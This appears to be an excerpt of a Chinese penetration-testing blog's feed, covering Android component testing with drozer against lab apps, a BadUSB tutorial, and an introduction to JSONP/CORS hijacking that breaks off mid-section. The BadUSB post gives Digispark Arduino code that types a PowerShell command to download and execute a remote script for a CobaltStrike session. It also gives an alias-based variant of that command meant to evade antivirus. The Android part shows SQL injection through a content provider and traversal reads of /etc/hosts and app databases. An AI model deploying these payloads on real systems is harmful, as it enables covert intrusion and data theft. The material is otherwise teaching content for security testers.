class="code"><pre><span class="line"><span class="comment"># 双引号内为注入的语句</span></span><br><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection <span class="string">&quot;&#x27;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013110430578.png" alt="image-20231013110430578"></p><p>查询所有表</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection <span class="string">&quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013110556263.png" alt="image-20231013110556263"></p><p>查询Passwords表</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection <span class="string">&quot;* FROM Passwords;--&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013110937259.png" alt="image-20231013110937259"></p><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a><strong>目录遍历</strong></h4><p>目录遍历漏洞扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013111123785.png" alt="image-20231013111123785"></p><p>利用目录遍历读取文件</p><p><code>/etc/hosts</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013111241044.png" alt="image-20231013111241044"></p><p><code>应用db文件</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db</span><br></pre></td></tr></table></figure><p>下载文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db C:/Users/Khaz/Desktop/database.db</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013111914892.png" alt="image-20231013111914892"></p><h3 id="Broadcast-Receiver"><a href="#Broadcast-Receiver" class="headerlink" title="Broadcast Receiver"></a>Broadcast Receiver</h3><table><thead><tr><th align="center">漏 洞种类</th><th align="center">危害</th></tr></thead><tbody><tr><td align="center">敏感信息泄露</td><td align="center">发送的intent没有明确指定接收者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。</td></tr><tr><td align="center">权限绕过</td><td align="center">可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过<receiver>标签静态注册，另一种是通过Context.registerReceiver()动态注册，指定相应的intentFilter参数，动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等</receiver></td></tr><tr><td align="center">消息伪造</td><td align="center">暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患</td></tr><tr><td align="center">拒绝服务</td><td align="center">如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。 拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。</td></tr></tbody></table><h4 id="查看可导出组件-broadcast"><a href="#查看可导出组件-broadcast" class="headerlink" title="查看可导出组件 broadcast"></a>查看可导出组件 broadcast</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.broadcast.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013112655673.png" alt="image-20231013112655673"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver</span><br></pre></td></tr></table></figure><h4 id="找到对应广播"><a href="#找到对应广播" class="headerlink" title="找到对应广播"></a>找到对应广播</h4><p><img src="/../images/image-20231013113616161.png" alt="image-20231013113616161"></p><h4 id="消息伪造"><a href="#消息伪造" class="headerlink" title="消息伪造"></a>消息伪造</h4><p>使用jadx反编译找到对应的源码信息，发现需要两个参数 phoneNumber、message</p><p><img src="/../images/image-20231013113543266.png" alt="image-20231013113543266"></p><p>发送恶意广播</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 12345 --extra string message khaz</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013114022116.png" alt="image-20231013114022116"></p><h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><p>发送不完整的广播</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013114122332.png" alt="image-20231013114122332"></p><h3 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h3><table><thead><tr><th align="center">漏洞种类</th><th align="center">危害</th></tr></thead><tbody><tr><td align="center">权限提升</td><td align="center">当一个service配置了intent<code>-</code>filter默认是被导出的，如果没对调用Service进行权限，限制或者是没有对调用者的身份进行有效验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意行为发生比如调用具有system权限的删除卸载服务删除卸载其他应用。</td></tr><tr><td align="center">service劫持</td><td align="center">隐式启动services,当存在同名services,先安装应用的services优先级高</td></tr><tr><td align="center">消息伪造</td><td align="center">暴露的Service对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Service接收可能产生安全隐患</td></tr><tr><td align="center">拒绝服务</td><td align="center">Service的拒绝服务主要来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致程序崩溃</td></tr></tbody></table><h4 id="获取可导出服务"><a href="#获取可导出服务" class="headerlink" title="获取可导出服务"></a><strong>获取可导出服务</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run app.service.info -a &lt;packagename&gt;</span></span><br><span class="line">dz&gt; run app.service.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  com.mwr.example.sieve.AuthService</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.CryptoService</span><br><span class="line">    Permission: null</span><br></pre></td></tr></table></figure><h1 id="其他测试姿势"><a href="#其他测试姿势" class="headerlink" title="其他测试姿势"></a>其他测试姿势</h1><ul><li>通过更改手机的型号来重置APP中的体验次数</li><li></li></ul><h1 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h1><p><strong>APP模拟器</strong></p><ul><li>夜神模拟器&gt;7.0.2（XPosed框架要求）</li></ul><p><strong>反编译</strong></p><ul><li>jadx-gui</li><li><a href="http://www.gda.wiki:9090/">GDA主页-亚洲首款交互式Android反编译器</a></li></ul><p><strong>APK签名</strong></p><ul><li><p>GetAPKInfo（验签）</p></li><li><p>apktool（打包&#x2F;解包）</p></li><li><p>signapk（签名）</p></li></ul><p><strong>APK漏扫</strong></p><ul><li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a></li><li><a href="https://mogua.co/">摸瓜-查诈骗APP<em>查病毒APP</em>免费APK反编译分析工具 (mogua.co)</a></li></ul><p><strong>其他小工具</strong></p><ul><li><p><a href="https://github.com/kelvinBen/AppInfoScanner">AppInfoScanner</a></p><blockquote><p>前提条件是脱了壳</p></blockquote><p>一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。</p></li><li><p><a href="https://github.com/sulab999/AppMessenger">sulab999&#x2F;AppMessenger: 一款适用于以APP病毒分析、APP漏洞挖掘、APP开发、HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS)辅助分析工具</a></p><p><img src="/../images/image-20231013135314599.png" alt="image-20231013135314599"></p></li></ul><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>App安全检测指南</p><p>[<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/98.%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/01.Android%20APP%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.html]">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/98.%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/01.Android%20APP%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.html]</a>(<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/98.%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/01.Android">https://blog.gm7.org/个人知识库/04.移动安全/98.常规测试流程/01.Android</a> APP常规测试流程.html)</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2NjUzNzg4Ng==&mid=2247483971&idx=1&sn=f4c726acbb472303b63c78bc442dddc8&chksm=ce481ab2f93f93a4cd3ba0cc1f66a6e98b25c6be28aacb19b0d228cb549967518d60da3858f3&cur_album_id=2988852703969787904&scene=189#wechat_redirect">App防抓包有四种绕过方法（详细）</a></p><p><a href="https://zhuanlan.zhihu.com/p/36538699">如何使用Xposed+JustTrustMe来突破SSL Pinning - 知乎</a></p><p><a href="https://developer.android.com/studio/command-line/adb.html?hl=zh-cn#pm">Android 调试桥 (adb)  | Android 开发者  | Android Developers</a></p><p>推荐：<a href="https://github.com/WindXaa/Android-Vulnerability-Mining">WindXaa&#x2F;Android-Vulnerability-Mining: Android APP漏洞之战系列，主要讲述如何快速挖掘APP漏洞 (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>近源渗透之BadUSB</title>
      <link href="/2023/10/07/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E4%B9%8BBadUsb/"/>
      <url>/2023/10/07/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E4%B9%8BBadUsb/</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><strong>诞生</strong></p><p>在2014年的BlackHat大会上，信息安全专家展示了一种新的网络安全威胁，这种技术被称为BadUSB，实际上是HID攻击，该漏洞由Karsten Nohl和Jakob Lell共同发现。</p><p><strong>HID</strong></p><p>HID是”Human Interface Device”的缩写，中文意为”人机接口设备”。HID是一种用于计算机和其他电子设备之间进行交互的标准化协议和接口。HID包括多种输入和输出设备，例如键盘、鼠标、游戏手柄、触摸屏、扫描仪等。这些设备通过HID协议与计算机通信，使用户能够通过这些设备与计算机进行交互操作。</p><p><strong>HID攻击</strong></p><p>一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将<strong>含有攻击向量的鼠标或键盘插入电脑</strong>时，<strong>恶意代码会被加载并执行</strong>。</p><p><strong>BadUsb的结构</strong></p><p>BadUsb的内部结构如下</p><p><img src="/../images/942cb02d-5333-4938-85ac-973f4c867ef4.png" alt="image.png"></p><p>可以看到，U盘大致由两部分组成，一部分是芯片引导程序，一部分是闪存区域。</p><p>控制器负责与PC的通讯和识别，闪存用来做数据存储；</p><p>闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；</p><p><strong>BadUsb攻击</strong></p><p>BadUsb的攻击与HID攻击类似，也是插入电脑后加载并执行恶意代码从而完成攻击。</p><p>BadUsb插入PC后，会模拟出一个虚拟键盘，同时执行我们事先写入到固件中的代码来敲击相应的按键，输入攻击代码从而完成一些恶意行为。</p><p><strong>BadUsb优势</strong></p><ul><li>只需要使用通用的USB设备（比如U盘）就可以完成HID攻击。</li><li>恶意代码烧录到固件中，而这部分区域是杀毒软件无法访问的区域，因此大部分杀毒软件是根本无法应对BadUsb攻击的</li></ul><p><strong>常见攻击场景</strong></p><p>黑客故意将写入了恶意程序的BadUsb丢在某个场所里，如果有人因为好奇心将BadUsb插入电脑中，那么其中的恶意程序就会运行，黑客从而可以控制这个人的电脑。比如护网行动，好奇的蓝方人员的电脑被红方人员以这种方式控制😨。</p><h1 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h1><ul><li><p>某宝开发板（关键词digispark）</p><p><img src="/../images/image-20231007114326582.png"></p></li><li><p>Ardunio IDE</p><p>下载地址<a href="https://www.arduino.cc/en/software">https://www.arduino.cc/en/software</a></p><p>下载完后打开Arduino IDE–&gt;文件–&gt;首选项–&gt;附加管理器网址：<a href="http://digistump.com/package_digistump_index.json">http://digistump.com/package_digistump_index.json</a></p><p><img src="/../images/image-20231007130123285.png" alt="image-20231007130123285"></p><p>工具–&gt;开发板–&gt;开发板管理器–&gt;安装<code>Digistump AVR</code> 软件包</p><p><img src="/../images/image-20231007130250973.png" alt="image-20231007130250973"></p></li><li><p>Digispark驱动</p><p><a href="https://github.com/digistump/DigistumpArduino/releases/tag/1.6.7">https://github.com/digistump/DigistumpArduino/releases/tag/1.6.7</a></p></li><li><p>CobaltStrike</p></li></ul><h1 id="开发板连接"><a href="#开发板连接" class="headerlink" title="开发板连接"></a>开发板连接</h1><p>板子成功连接电脑后，可以在设备管理器中看到</p><p><img src="/../images/image-20231007130836961.png" alt="image-20231007130836961"></p><p>遇到一个问题就是，这玩意插上去没有显示端口，Ardunio连接不了，而且一直闪红灯😢。</p><p>经过搜索才知道, 这块板子接上电源只保持 <code>5s</code> 的连接, 然后自动运行板子内的程序。</p><p>所以正确的烧录方式是先点击上传, 等到终端提示接入设备的时候, 再接入设备烧录程序。</p><p><img src="/../images/image-20231007130725980.png" alt="image-20231007130725980"></p><h1 id="DigiKeyboard-h使用"><a href="#DigiKeyboard-h使用" class="headerlink" title="DigiKeyboard.h使用"></a>DigiKeyboard.h使用</h1><p>主要利用该库来模拟键盘和鼠标输入</p><p>在github上找到了数字按键表</p><p><img src="/../images/68747470733a2f2f736372697074656c2e636f6d2f4b6579626f617264456d756c6174696f6e4150492f4a6176615363726970742f696d616765732f6b6579626f6172642d6964656e746966696572732e706e67" alt="KeyCodes"></p><p>预设常量</p><p><a href="https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h">https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h</a></p><p>常用函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DigiKeyboard.println(<span class="string">&quot;text&quot;</span>); # 用于向模拟键盘发送文本并在计算机上输入一行字符并自动在末尾添加一个回车符</span><br><span class="line"></span><br><span class="line">DigiKeyboard.sendKeyStroke(key); # 用于模拟按下和释放一个指定的按键</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(ms) # 用于在执行后续操作前暂停一段时间，单位为毫秒</span><br></pre></td></tr></table></figure><h1 id="弹计算器"><a href="#弹计算器" class="headerlink" title="弹计算器"></a>弹计算器</h1><p>Arduino代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line">String a;</span><br><span class="line">String b;</span><br><span class="line">String c;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>); <span class="comment">// 开启CapsLock大写锁定键绕过中文输入法问题(windows大小写不敏感)</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); <span class="comment">// 按下Win+R键</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">800</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;calc&quot;</span>); <span class="comment">// 打开计算器</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>); <span class="comment">// 关闭CapsLock大写锁定键</span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%8A%A8%E7%94%BB.gif" alt="动画"></p><h1 id="PowerShell-Bypass火绒上线CS"><a href="#PowerShell-Bypass火绒上线CS" class="headerlink" title="PowerShell  Bypass火绒上线CS"></a>PowerShell  Bypass火绒上线CS</h1><p><a href="https://mp.weixin.qq.com/s/5Bx9fYiI_mK2yimSsDyhoA">干货 | 我的powershell免杀之路 (qq.com)</a></p><p>原始payload</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.23.102:8000/one_liner.ps1&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231007134142125.png" alt="image-20231007134142125"></p><p>Bypass</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="built_in">set-alias</span> <span class="literal">-name</span> kaspersky <span class="literal">-value</span> <span class="built_in">Invoke-Expression</span>;kaspersky(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.23.102:8000/one_liner.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>转化为Arduino代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line">String a;</span><br><span class="line">String b;</span><br><span class="line">String c;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);<span class="comment">//开启CapsLock大写锁定键</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<span class="comment">//按下Win+R键</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">800</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.23.102:8000/one_liner.ps1&#x27;)&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);<span class="comment">//关闭CapsLock大写锁定键</span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/22.gif" alt="22"></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>由于恶意代码内置于设备初始化固件中，而不是通过autorun.inf等媒体自动播放文件进行控制，因此无法通过禁用媒体自动播放进行防御，杀毒软件更是无法检测设备固件中的恶意代码。目前也没有什么有效的方式去防御BadUSB，毕竟无法阻挡电脑去识别键盘鼠标此类的HID设备。所以说针对BadUSB的防御方法还是在于人员的安全意识上，当发现可疑的U盘时切莫因好奇插入自己的电脑。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JSONP与CORS</title>
      <link href="/2023/10/05/Web%E5%AE%89%E5%85%A8%E4%B9%8BJSONP%E4%B8%8ECORS/"/>
      <url>/2023/10/05/Web%E5%AE%89%E5%85%A8%E4%B9%8BJSONP%E4%B8%8ECORS/</url>
      
        <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p><strong>同源策略</strong></p><ul><li><p>目的</p><blockquote><p>同源策略的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p><p>设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？</p><p>很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p><p>由此可见，”同源策略”是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p></blockquote></li><li><p>定义</p><p>两个web界面只有同协议，同域名，同端口才是同源的</p><p><img src="/../images/pxbcwxexdh-1686840019399.png" alt="img"></p></li></ul><h1 id="JSONP漏洞"><a href="#JSONP漏洞" class="headerlink" title="JSONP漏洞"></a>JSONP漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul><li><p>JSONP</p><blockquote><p>由于浏览器的同源策略限制，通常情况下，客户端除了可以跨域获取图片，CSS，JavaScript形式的数据外无法从不同源的web站点获取数据。JSONP就是利用了JavaScript可以跨域加载的特点，将接口设计为json格式，从而可以跨域调用JSONP接口来获取数据。</p></blockquote></li><li><p>JSONP劫持漏洞</p><blockquote><p>JSONP劫持漏洞是指网站JSONP接口泄露的信息可被攻击者通过在可控网站构造请求的方式，操作用户浏览器<strong>跨域读取并接收</strong>的一类安全问题。</p></blockquote></li></ul><h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>下面通过Demo代码演示</p><p>假设<a href="http://debug.io:90/%E4%B8%8A%E5%AD%98%E5%9C%A8%E5%A6%82%E4%B8%8B%E4%BB%A3%E7%A0%81">http://debug.io:90/上存在如下代码</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//jsonp.php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#123;&quot;name&quot; : &quot;khaz&quot;,&quot;age&quot; : &quot;18&quot;&#125;);&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231005201905213.png" alt="image-20231005201905213"></p><p>那么<a href="http://localhost可以通过以下方式获取http//debug.io:90/%E4%B8%8A%E7%9A%84%E6%95%B0%E6%8D%AE">http://localhost可以通过以下方式获取http://debug.io:90/上的数据</a></p><ul><li><p>script标签的src属性</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--1.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(data.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://debug.io:90/jsonp.php?callback=test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231005202129724.png" alt="image-20231005202129724"></p></li><li><p>ajax请求</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">getJSON</span>(<span class="string">&quot;http://debug.io:90/jsonp.php?callback=?&quot;</span>, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">alert</span>(data.<span class="property">age</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231005202436331.png" alt="image-20231005202436331"></p></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a><strong>攻击流程</strong></h3><p><img src="/../images/jsonp-exploit.png" alt="jsonp-exploit"></p><p>当网站的JSONP接口没有做好防护，并且存在敏感数据时，攻击者就可以构造恶意的html页面诱导受害者点击，从而携带用户的cookie等信息向jsonp接口发起请求，并通过callback将获取到的敏感数据发给攻击者。</p><h3 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">_callback=mstkey</span><br><span class="line">_cb=mstkey</span><br><span class="line">callback=mstkey</span><br><span class="line">cb=mstkey</span><br><span class="line">jsonp=mstkey</span><br><span class="line">jsonpcallback=mstkey</span><br><span class="line">jsonpcb=mstkey</span><br><span class="line">jsonp_cb=mstkey</span><br><span class="line">json=mstkey</span><br><span class="line">jsoncallback=mstkey</span><br><span class="line">jcb=mstkey</span><br><span class="line">call=mstkey</span><br><span class="line">callBack=mstkey</span><br><span class="line">jsonpCallback=mstkey</span><br><span class="line">jsonpCb=mstkey</span><br><span class="line">jsonp_Cb=mstkey</span><br><span class="line">jsonCallback=mstkey</span><br><span class="line">ca=mstkey</span><br></pre></td></tr></table></figure><h3 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h3><ul><li><p>获取jsonp中的敏感信息</p></li><li><p>水坑攻击</p><p>水坑攻击就是在受害者必经之路设置一个水坑，也就是陷阱。攻击者通过分析受害者的上网活动规律，经常访问哪些网站，然后利用网站漏洞在其中植入攻击代码。比如攻击者通过分析得知受害者经常访问网站A和B，并想要得到受害者在网站A上的敏感数据，而网站B安全性相对薄弱，于是攻击者在网站B中植入JSONP利用代码，当受害者访问网站B时，就会通过JSONP跨域访问网站A从而获取受害者在网站A上的敏感数据。</p></li><li><p>蜜罐溯源</p><p>蜜罐能够对攻击者画像进行画像和溯源的原理就是蜜罐中集成了大量社交网站的JSONP接口。当攻击者发起攻击时，如果其使用的浏览器保存了社交网站的登录信息，就有可能因为触发了蜜罐的JSONP利用代码而留下个人社交信息。</p></li></ul><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul><li>对请求的来源进行校验，如Referer，Origin等参数</li><li>尽量不使用JSONP接口来传输敏感数据</li><li>使用CORS来代替JSONP</li></ul><h1 id="CORS漏洞"><a href="#CORS漏洞" class="headerlink" title="CORS漏洞"></a>CORS漏洞</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>CORS漏洞是指因为网站配置缺陷如Access-Control-Allow-Origin配置为”*”时，导致其他网站可以直接跨域加载读取该网站上的数据。</p><p><strong>CORS</strong></p><blockquote><p>CORS（Cross-Origin Resource 